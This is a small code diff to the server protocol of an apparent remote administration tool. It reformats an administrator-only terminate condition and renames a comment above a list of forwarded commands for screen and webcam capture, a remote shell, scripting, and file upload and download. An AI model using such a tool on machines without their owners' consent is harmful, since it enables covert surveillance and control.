@@ -494,10 +494,9 @@ class ModeratServerProtocol(LineReceiver):
 
             # FILTERS
             # For Only Administrators
-            elif mode in ['terminateClient',] \
-                    and manageModerators.get_privs(moderator_username) == 1:
+            elif mode in ['terminateClient'] and manageModerators.get_privs(moderator_username) == 1:
                 self.send_message_to_client(clients[client_key]['socket'], payload, mode, session_id=session_id)
-            # For Moderators
+            # Forward To Client
             elif mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource',
                                   'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode',
                                   'downloadMode', 'uploadMode',]:
